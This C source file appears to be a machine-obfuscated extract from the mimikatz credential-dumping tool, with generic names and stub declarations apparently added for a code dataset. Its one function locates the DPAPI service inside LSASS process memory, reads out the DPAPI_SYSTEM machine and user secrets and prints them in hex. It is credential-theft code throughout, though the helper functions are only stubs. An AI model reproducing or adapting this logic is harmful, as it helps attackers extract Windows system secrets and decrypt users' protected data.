#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_15__   TYPE_7__ ;
typedef  struct TYPE_14__   TYPE_6__ ;
typedef  struct TYPE_13__   TYPE_3__ ;
typedef  struct TYPE_12__   TYPE_2__ ;
typedef  struct TYPE_11__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
typedef  int /*<<< orphan*/  rgbSystemCredUser ;
typedef  int /*<<< orphan*/  rgbSystemCredMachine ;
typedef  int /*<<< orphan*/  fSystemCredsInitialized ;
struct TYPE_15__ {int /*<<< orphan*/  isInit; scalar_t__ isPresent; } ;
struct TYPE_11__ {scalar_t__ BuildNumber; } ;
struct TYPE_14__ {TYPE_1__ osContext; int /*<<< orphan*/ * hLsassMem; } ;
struct TYPE_13__ {int /*<<< orphan*/ ** address; int /*<<< orphan*/ * member_1; int /*<<< orphan*/ * member_0; } ;
struct TYPE_12__ {TYPE_7__ Module; } ;
typedef  void* PVOID ;
typedef  TYPE_2__* PKUHL_M_SEKURLSA_PACKAGE ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  TYPE_3__ KULL_M_MEMORY_ADDRESS ;
typedef  int /*<<< orphan*/  BYTE ;
typedef  int /*<<< orphan*/ * BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  KULL_M_MEMORY_GLOBAL_OWN_HANDLE ; 
 scalar_t__ KULL_M_WIN_MIN_BUILD_8 ; 
 scalar_t__ FUNC1 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (char*) ; 
 int SHA_DIGEST_LENGTH ; 
 int /*<<< orphan*/  SysCredReferences ; 
 TYPE_6__ cLsass ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 () ; 
 TYPE_2__ kuhl_m_sekurlsa_dpapi_lsa_package ; 
 TYPE_2__ kuhl_m_sekurlsa_dpapi_svc_package ; 
 scalar_t__ FUNC5 (TYPE_6__*,TYPE_7__*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,void**,void**,void**,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC6 (TYPE_3__*,TYPE_3__*,int) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ *,int,int /*<<< orphan*/ ) ; 

NTSTATUS FUNC8(int argc, wchar_t * argv[])
{
	NTSTATUS status = FUNC4();
	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, aLocal = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	PKUHL_M_SEKURLSA_PACKAGE pPackage = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package : &kuhl_m_sekurlsa_dpapi_lsa_package;
	PVOID pBool = NULL, pShaSystem = NULL, pShaUser = NULL;
	BOOL fSystemCredsInitialized;
	BYTE origInit, rgbSystemCredMachine[SHA_DIGEST_LENGTH], rgbSystemCredUser[SHA_DIGEST_LENGTH];

	if(FUNC1(status))
	{
		if(pPackage->Module.isPresent)
		{
			origInit = pPackage->Module.isInit;
			if(FUNC5(&cLsass, &pPackage->Module, SysCredReferences, FUNC0(SysCredReferences), &pBool, &pShaSystem, &pShaUser, NULL))
			{
				pPackage->Module.isInit = origInit; // trick to use same packages as normal module.
				aLocal.address = &fSystemCredsInitialized;
				aLsass.address = pBool;
				if(FUNC6(&aLocal, &aLsass, sizeof(fSystemCredsInitialized)))
				{
					if(fSystemCredsInitialized)
					{
						FUNC3(L"DPAPI_SYSTEM\n");
						aLocal.address = &rgbSystemCredMachine;
						aLsass.address = pShaSystem;
						if(FUNC6(&aLocal, &aLsass, sizeof(rgbSystemCredMachine)))
						{
							aLocal.address = &rgbSystemCredUser;
							aLsass.address = pShaUser;
							if(FUNC6(&aLocal, &aLsass, sizeof(rgbSystemCredUser)))
							{
								FUNC3(L"full: ");
								FUNC7(rgbSystemCredMachine, sizeof(rgbSystemCredMachine), 0);
								FUNC7(rgbSystemCredUser, sizeof(rgbSystemCredUser), 0);
								FUNC3(L"\nm/u : ");
								FUNC7(rgbSystemCredMachine, sizeof(rgbSystemCredMachine), 0);
								FUNC3(L" / ");
								FUNC7(rgbSystemCredUser, sizeof(rgbSystemCredUser), 0);
								FUNC3(L"\n");
							}
						}
					}
					else FUNC2(L"Not initialized!\n");
				}
			}
			else FUNC2(L"Pattern not found in DPAPI service\n");
		}
		else FUNC2(L"DPAPI service not in LSASS memory\n");
	}
	return status;
}